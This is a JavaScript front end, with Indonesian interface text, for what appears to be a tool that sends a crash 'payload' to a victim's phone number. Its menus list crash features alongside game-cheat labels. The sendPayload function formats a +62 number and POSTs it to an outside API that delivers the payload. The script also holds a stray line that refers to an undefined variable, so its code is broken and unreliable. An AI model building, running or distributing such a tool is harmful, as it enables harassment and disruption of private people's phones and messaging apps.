alert('script.js LOADED');
function updateClock() {
    const now = new Date();
    const hours = String(now.getHours()).padStart(2, '0');
    const minutes = String(now.getMinutes()).padStart(2, '0');
    document.getElementById('clock').textContent = `${hours}:${minutes}`;
}
setInterval(updateClock, 1000);
updateClock();

function setActive(element) {
    document.querySelectorAll('.nav-item').forEach(item => {
        item.classList.remove('active');
    });
    element.classList.add('active');
}

const bugFeatures = {
    crash: {
        title: '⚡ Crash Features',
        items: [
            { name: 'Crash NameTag', tag: 'NameTag' },
            { name: 'Crash Headshot', tag: 'Headshot' },
            { name: 'Crash Rank', tag: 'Rank' },
            { name: 'Crash Lobby', tag: 'Lobby' },
            { name: 'Crash Match', tag: 'Match' }
        ]
    },
    multi: {
        title: '👥 Multi Target Features',
        items: [
            { name: 'Multi NameTag', tag: 'NameTag' },
            { name: 'Multi Headshot', tag: 'Headshot' },
            { name: 'Multi Aimbot', tag: 'Aimbot' },
            { name: 'Multi Auto Kill', tag: 'AutoKill' },
            { name: 'Multi Wallhack', tag: 'Wallhack' }
        ]
    },
    fast: {
        title: '⏱️ Fast Execution Features',
        items: [
            { name: 'Fast NameTag', tag: 'NameTag' },
            { name: 'Fast Reload', tag: 'Reload' },
            { name: 'Fast Switch', tag: 'Switch' },
            { name: 'Fast Speed', tag: 'Speed' },
            { name: 'Fast Fire', tag: 'Fire' }
        ]
    },
    anti: {
        title: '🔋 Anti Lag Features',
        items: [
            { name: 'Anti Lag NameTag', tag: 'NameTag' },
            { name: 'Anti Lag FPS', tag: 'FPS' },
            { name: 'Anti Lag Ping', tag: 'Ping' },
            { name: 'Anti Lag Graphics', tag: 'Graphics' },
            { name: 'Anti Lag Network', tag: 'Network' }
        ]
    }
};

function openModal(type) {
    const modal = document.getElementById('bugModal');
    const title = document.getElementById('modalTitle');
    const container = document.getElementById('bugListContainer');
    
    const data = bugFeatures[type];
    
    title.textContent = data.title;
    container.innerHTML = '';
    
    data.items.forEach(item => {
        const div = document.createElement('div');
        div.className = 'bug-item';
        div.innerHTML = `
            <span class="bug-name">${item.name}</span>
            <span class="bug-tag">${item.tag}</span>
            <span class="arrow">›</span>
        `;
        div.onclick = function() {
            alert(`Anda memilih fitur: ${item.name}`);
        };
        container.appendChild(div);
    });
    
    modal.style.display = 'flex';
}

function closeModal(event) {
    if (event.target.id === 'bugModal' || event.target.classList.contains('close-btn')) {
        document.getElementById('bugModal').style.display = 'none';
    }
}
  let nomor = target.replace(/\D/g, '');
async function sendPayload() {
  const target = document.getElementById('targetInput').value.trim();
  if (!target) { alert('Masukkan nomor target!'); return; }
  let nomor = target.replace(/\D/g, '');
  if (nomor.startsWith('0')) nomor = '62' + nomor.slice(1);
  else if (nomor.startsWith('8')) nomor = '62' + nomor;
  else if (!nomor.startsWith('62')) nomor = '62' + nomor;
  try {
    const res = await fetch("https://vercel-api-boomerapps.vercel.app/api/send", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ target: nomor })
    });
    const data = await res.json();
    if (res.ok) alert('Payload terkirim ke ' + nomor);
    else alert('Gagal: ' + (data.error || 'Unknown error'));
  } catch (err) {
    alert('Error: ' + err.message);
  }
}